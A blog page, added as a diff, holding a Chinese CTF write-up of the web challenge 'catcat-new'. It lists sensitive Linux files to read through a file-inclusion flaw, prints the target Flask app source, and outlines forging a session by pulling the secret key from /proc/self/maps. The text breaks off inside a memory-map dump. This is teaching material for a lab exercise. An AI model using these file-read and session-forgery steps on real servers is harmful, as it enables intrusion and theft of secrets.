@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+       
+      <meta name="keywords" content="生活，思考 ，渗透，审计，代码。。。" />
+       
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>【攻防世界】Web系列之catcat-new |  小透的少年江湖</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/haoyun.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-【攻防世界】Web系列之catcat-new"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  【攻防世界】Web系列之catcat-new
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Web%E7%B3%BB%E5%88%97%E4%B9%8Bcatcat-new/" class="article-date">
+  <time datetime="2024-01-17T01:56:28.000Z" itemprop="datePublished">2024-01-17</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a> / <a class="article-category-link" href="/categories/CTF/Web/">Web</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">4.6k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">27 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="【攻防世界】Web系列之catcat-new"><a href="#【攻防世界】Web系列之catcat-new" class="headerlink" title="【攻防世界】Web系列之catcat-new"></a>【攻防世界】Web系列之catcat-new</h1><p>题目环境可以判断出来存在任意文件包含漏洞，无法遍历到flag文件</p>
+<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Web%E7%B3%BB%E5%88%97%E4%B9%8Bcatcat-new/image-20231224205152502.png" class title="image-20231224205152502">
+
+<p>这里简单列举几个linux常见的敏感文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">/proc/self      #当前运行进程</span><br><span class="line">/proc/self/cmdline  #当前进程命令行参数=</span><br><span class="line">/proc/self/men     #当前进程的内存内容</span><br><span class="line">/proc/self/maps    #当前进程的内存映射关系</span><br><span class="line">/proc/self/environ #包含当前进程的环境变量</span><br><span class="line">/proc/self/fd  #包含当前进程打开的文件的内容和路径</span><br><span class="line">/proc/seflf/exe   #获取当前jin&#x27;c</span><br></pre></td></tr></table></figure>
+
+<p>使用php:&#x2F;&#x2F;input伪协议尝试写入shell，返回失败，后端可能不是php</p>
+<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Web%E7%B3%BB%E5%88%97%E4%B9%8Bcatcat-new/image-20231224205342660.png" class title="image-20231224205342660">
+
+
+
+<p>查看&#x2F;proc&#x2F;self&#x2F;cmdline当前运行的进程参数行命令，发现使用python启动app.py</p>
+<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Web%E7%B3%BB%E5%88%97%E4%B9%8Bcatcat-new/image-20231224205812081.png" class title="image-20231224205812081">
+
+<p>app.py可以判断出使用的是Flask框架开发的网站，我们去遍历该app.py文件</p>
+<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Web%E7%B3%BB%E5%88%97%E4%B9%8Bcatcat-new/image-20231224210147178.png" class title="image-20231224210147178">
+
+<p>这里对输出的app.py文件作了简单处理，得到如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, Markup</span><br><span class="line"><span class="keyword">from</span> cat <span class="keyword">import</span> cat</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">app = Flask(</span><br><span class="line"> __name__,</span><br><span class="line"> static_url_path=<span class="string">&#x27;/&#x27;</span>, </span><br><span class="line"> static_folder=<span class="string">&#x27;static&#x27;</span> </span><br><span class="line">)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;*abcdefgh&quot;</span> <span class="comment">#随机生成一串字符并在后面添加字符串</span></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(<span class="string">&quot;/flag&quot;</span>):</span><br><span class="line"> flag = cat(<span class="string">&quot;/flag&quot;</span>)<span class="comment">#导入flag文件</span></span><br><span class="line"> os.remove(<span class="string">&quot;/flag&quot;</span>)<span class="comment">#删除flag文件</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line"> detailtxt = os.listdir(<span class="string">&#x27;./details/&#x27;</span>)</span><br><span class="line"> cats_list = []</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> detailtxt:</span><br><span class="line"> cats_list.append(i[:i.index(<span class="string">&#x27;.&#x27;</span>)])</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, cats_list=cats_list, cat=cat)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/info&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>():</span></span><br><span class="line"> filename = <span class="string">&quot;./details/&quot;</span> + request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"> start = request.args.get(<span class="string">&#x27;start&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"> end = request.args.get(<span class="string">&#x27;end&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"> name = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)[:request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>).index(<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">return</span> render_template(<span class="string">&quot;detail.html&quot;</span>, catname=name, info=cat(filename, start, end))</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_can_list_root</span>():</span></span><br><span class="line"> <span class="keyword">if</span> session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:  <span class="comment">#当session信息中admin=1在/admin路径下才返回flag</span></span><br><span class="line"> <span class="keyword">return</span> flag</span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line"> session[<span class="string">&#x27;admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;NoNoNo&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">5637</span>)</span><br></pre></td></tr></table></figure>
+
+<p>上面的代码基本可以得出解题逻辑：在&#x2F;admin路径下判断seesion中是否存在admin&#x3D;1字段，则返回flag文件，随后导入flag文件并删除。所以需要对flask_seesion进行伪造，首先需要获取secret_key，可以在&#x2F;proc&#x2F;self&#x2F;maps里面找到内存数据的映射关系从而寻找secret_key值。</p>
+<p>如下为maps数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line">56322e390000-56322e391000 r--p 00000000 fd:00 23480232 /usr/local/bin/python3.7</span><br><span class="line">56322e391000-56322e392000 r-xp 00001000 fd:00 23480232 /usr/local/bin/python3.7</span><br><span class="line">56322e392000-56322e393000 r--p 00002000 fd:00 23480232 /usr/local/bin/python3.7</span><br><span class="line">56322e393000-56322e394000 r--p 00002000 fd:00 23480232 /usr/local/bin/python3.7</span><br><span class="line">56322e394000-56322e395000 rw-p 00003000 fd:00 23480232 /usr/local/bin/python3.7</span><br><span class="line">56322eccc000-56322eccd000 ---p 00000000 00:00 0 [heap]</span><br><span class="line">56322eccd000-56322ecd1000 rw-p 00000000 00:00 0 [heap]</span><br><span class="line">7f82072af000-7f820732f000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207432000-7f8207434000 ---p 00000000 00:00 0 </span><br><span class="line">7f8207434000-7f820753d000 rw-p 00000000 00:00 0 </span><br><span class="line">7f820754a000-7f820754e000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207554000-7f8207558000 rw-p 00000000 00:00 0 </span><br><span class="line">7f820755c000-7f82076f0000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82076f1000-7f8207774000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207777000-7f82077bb000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82077bb000-7f82077bd000 r--p 00000000 fd:00 23480898 /usr/local/lib/python3.7/lib-dynload/_posixsubprocess.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82077bd000-7f82077bf000 r-xp 00002000 fd:00 23480898 /usr/local/lib/python3.7/lib-dynload/_posixsubprocess.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82077bf000-7f82077c0000 r--p 00004000 fd:00 23480898 /usr/local/lib/python3.7/lib-dynload/_posixsubprocess.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82077c0000-7f82077c1000 r--p 00004000 fd:00 23480898 /usr/local/lib/python3.7/lib-dynload/_posixsubprocess.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82077c1000-7f82077c2000 rw-p 00005000 fd:00 23480898 /usr/local/lib/python3.7/lib-dynload/_posixsubprocess.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82077c2000-7f82077ce000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82077d1000-7f82078c5000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82078c6000-7f8207938000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207938000-7f820793e000 r--p 00000000 fd:00 23480885 /usr/local/lib/python3.7/lib-dynload/_decimal.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820793e000-7f8207975000 r-xp 00006000 fd:00 23480885 /usr/local/lib/python3.7/lib-dynload/_decimal.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8207975000-7f8207981000 r--p 0003d000 fd:00 23480885 /usr/local/lib/python3.7/lib-dynload/_decimal.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8207981000-7f8207982000 r--p 00048000 fd:00 23480885 /usr/local/lib/python3.7/lib-dynload/_decimal.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8207982000-7f820798a000 rw-p 00049000 fd:00 23480885 /usr/local/lib/python3.7/lib-dynload/_decimal.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820798a000-7f8207a15000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207a15000-7f8207a63000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207a63000-7f8207a66000 r--p 00000000 fd:00 23480934 /usr/local/lib/python3.7/lib-dynload/unicodedata.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8207a66000-7f8207a6a000 r-xp 00003000 fd:00 23480934 /usr/local/lib/python3.7/lib-dynload/unicodedata.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8207a6a000-7f8207b4b000 r--p 00007000 fd:00 23480934 /usr/local/lib/python3.7/lib-dynload/unicodedata.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8207b4b000-7f8207b4c000 r--p 000e7000 fd:00 23480934 /usr/local/lib/python3.7/lib-dynload/unicodedata.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8207b4c000-7f8207b69000 rw-p 000e8000 fd:00 23480934 /usr/local/lib/python3.7/lib-dynload/unicodedata.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8207b69000-7f8207b75000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207b76000-7f8207c06000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207c07000-7f8207d33000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207d33000-7f8207d4f000 r--p 00000000 fd:00 23348864 /lib/libssl.so.1.1</span><br><span class="line">7f8207d4f000-7f8207d8f000 r-xp 0001c000 fd:00 23348864 /lib/libssl.so.1.1</span><br><span class="line">7f8207d8f000-7f8207da7000 r--p 0005c000 fd:00 23348864 /lib/libssl.so.1.1</span><br><span class="line">7f8207da7000-7f8207db0000 r--p 00073000 fd:00 23348864 /lib/libssl.so.1.1</span><br><span class="line">7f8207db0000-7f8207db4000 rw-p 0007c000 fd:00 23348864 /lib/libssl.so.1.1</span><br><span class="line">7f8207db4000-7f8207f85000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207f86000-7f8208003000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208004000-7f8208017000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208017000-7f8208019000 r--p 00000000 fd:00 23480918 /usr/local/lib/python3.7/lib-dynload/binascii.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208019000-7f820801d000 r-xp 00002000 fd:00 23480918 /usr/local/lib/python3.7/lib-dynload/binascii.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820801d000-7f820801f000 r--p 00006000 fd:00 23480918 /usr/local/lib/python3.7/lib-dynload/binascii.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820801f000-7f8208020000 r--p 00007000 fd:00 23480918 /usr/local/lib/python3.7/lib-dynload/binascii.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208020000-7f8208021000 rw-p 00008000 fd:00 23480918 /usr/local/lib/python3.7/lib-dynload/binascii.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208021000-7f8208026000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208026000-7f820802b000 r--p 00000000 fd:00 23480883 /usr/local/lib/python3.7/lib-dynload/_datetime.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820802b000-7f8208036000 r-xp 00005000 fd:00 23480883 /usr/local/lib/python3.7/lib-dynload/_datetime.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208036000-7f820803b000 r--p 00010000 fd:00 23480883 /usr/local/lib/python3.7/lib-dynload/_datetime.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820803b000-7f820803c000 r--p 00014000 fd:00 23480883 /usr/local/lib/python3.7/lib-dynload/_datetime.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820803c000-7f820803e000 rw-p 00015000 fd:00 23480883 /usr/local/lib/python3.7/lib-dynload/_datetime.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820803e000-7f82080ac000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82080ac000-7f82080ae000 r--p 00000000 fd:00 23480930 /usr/local/lib/python3.7/lib-dynload/select.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080ae000-7f82080b2000 r-xp 00002000 fd:00 23480930 /usr/local/lib/python3.7/lib-dynload/select.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080b2000-7f82080b3000 r--p 00006000 fd:00 23480930 /usr/local/lib/python3.7/lib-dynload/select.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080b3000-7f82080b4000 r--p 00006000 fd:00 23480930 /usr/local/lib/python3.7/lib-dynload/select.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080b4000-7f82080b6000 rw-p 00007000 fd:00 23480930 /usr/local/lib/python3.7/lib-dynload/select.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080b6000-7f82080c0000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82080c0000-7f82080c4000 r--p 00000000 fd:00 23480905 /usr/local/lib/python3.7/lib-dynload/_socket.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080c4000-7f82080cd000 r-xp 00004000 fd:00 23480905 /usr/local/lib/python3.7/lib-dynload/_socket.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080cd000-7f82080d2000 r--p 0000d000 fd:00 23480905 /usr/local/lib/python3.7/lib-dynload/_socket.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080d2000-7f82080d3000 r--p 00011000 fd:00 23480905 /usr/local/lib/python3.7/lib-dynload/_socket.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080d3000-7f82080d8000 rw-p 00012000 fd:00 23480905 /usr/local/lib/python3.7/lib-dynload/_socket.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080d8000-7f82080dd000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82080de000-7f82080e7000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82080e7000-7f82080e8000 r--p 00000000 fd:00 23480876 /usr/local/lib/python3.7/lib-dynload/_contextvars.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080e8000-7f82080e9000 r-xp 00001000 fd:00 23480876 /usr/local/lib/python3.7/lib-dynload/_contextvars.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080e9000-7f82080ea000 r--p 00002000 fd:00 23480876 /usr/local/lib/python3.7/lib-dynload/_contextvars.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080ea000-7f82080eb000 r--p 00002000 fd:00 23480876 /usr/local/lib/python3.7/lib-dynload/_contextvars.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080eb000-7f82080ec000 rw-p 00003000 fd:00 23480876 /usr/local/lib/python3.7/lib-dynload/_contextvars.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080ec000-7f820816c000 rw-p 00000000 00:00 0 </span><br><span class="line">7f820816d000-7f82081c5000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82081c6000-7f820835a000 rw-p 00000000 00:00 0 </span><br><span class="line">7f820835a000-7f820835b000 r--p 00000000 fd:00 23480896 /usr/local/lib/python3.7/lib-dynload/_opcode.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820835b000-7f820835c000 r-xp 00001000 fd:00 23480896 /usr/local/lib/python3.7/lib-dynload/_opcode.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820835c000-7f820835d000 r--p 00002000 fd:00 23480896 /usr/local/lib/python3.7/lib-dynload/_opcode.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820835d000-7f820835e000 r--p 00002000 fd:00 23480896 /usr/local/lib/python3.7/lib-dynload/_opcode.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820835e000-7f820835f000 rw-p 00003000 fd:00 23480896 /usr/local/lib/python3.7/lib-dynload/_opcode.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820835f000-7f82083b6000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82083b6000-7f82083b7000 r--p 00000000 fd:00 23480900 /usr/local/lib/python3.7/lib-dynload/_random.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083b7000-7f82083ba000 r-xp 00001000 fd:00 23480900 /usr/local/lib/python3.7/lib-dynload/_random.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083ba000-7f82083bb000 r--p 00004000 fd:00 23480900 /usr/local/lib/python3.7/lib-dynload/_random.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083bb000-7f82083bc000 r--p 00004000 fd:00 23480900 /usr/local/lib/python3.7/lib-dynload/_random.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083bc000-7f82083bd000 rw-p 00005000 fd:00 23480900 /usr/local/lib/python3.7/lib-dynload/_random.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083bd000-7f82083be000 r--p 00000000 fd:00 23480867 /usr/local/lib/python3.7/lib-dynload/_bisect.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083be000-7f82083bf000 r-xp 00001000 fd:00 23480867 /usr/local/lib/python3.7/lib-dynload/_bisect.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083bf000-7f82083c0000 r--p 00002000 fd:00 23480867 /usr/local/lib/python3.7/lib-dynload/_bisect.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083c0000-7f82083c1000 r--p 00002000 fd:00 23480867 /usr/local/lib/python3.7/lib-dynload/_bisect.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083c1000-7f82083c2000 rw-p 00003000 fd:00 23480867 /usr/local/lib/python3.7/lib-dynload/_bisect.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083c2000-7f82083c4000 r--p 00000000 fd:00 23480903 /usr/local/lib/python3.7/lib-dynload/_sha3.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083c4000-7f82083d8000 r-xp 00002000 fd:00 23480903 /usr/local/lib/python3.7/lib-dynload/_sha3.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083d8000-7f82083da000 r--p 00016000 fd:00 23480903 /usr/local/lib/python3.7/lib-dynload/_sha3.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083da000-7f82083db000 r--p 00017000 fd:00 23480903 